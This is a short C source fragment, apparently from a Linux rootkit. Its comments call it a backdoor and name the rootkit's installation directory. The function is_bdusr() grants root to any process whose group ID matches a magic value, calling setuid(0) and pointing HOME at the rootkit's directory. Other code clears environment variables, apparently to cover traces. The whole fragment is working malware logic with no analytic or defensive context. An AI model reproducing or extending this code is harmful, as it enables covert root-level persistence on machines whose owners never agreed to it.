/* unset variables that we definitely do not need or want set */
void unset_bad_vars(void){
    for(int i = 0; i < UNSET_VARIABLES_SIZE; i++)
        unsetenv(unset_variables[i]);
}

int is_bdusr(void){
#ifndef HIDE_SELF
    return 1;
#endif

    int ret = 0;

    if(getenv(BD_VAR) != NULL){
        ret = 1;            /* there's zero point in doing the check */
        goto end_isbdusr;   /* below too, after this. unset bad vars */
                            /* and return.                           */
    }

    /* backdoor user shells, by default, don't set BD_VAR
     * in the environment. so if the check above bore no
     * fruits, we're most likely a proper backdoor user.
     * set the HOME environment variable. */
    if(getgid() == MAGIC_GID){
        ret = 1;
        setuid(0);
        /* set our home environment variable
         * to the location of the rootkit's
         * installation directory. */
        putenv(HOME_VAR);
    }

end_isbdusr:
    if(ret) unset_bad_vars();
    return ret;
}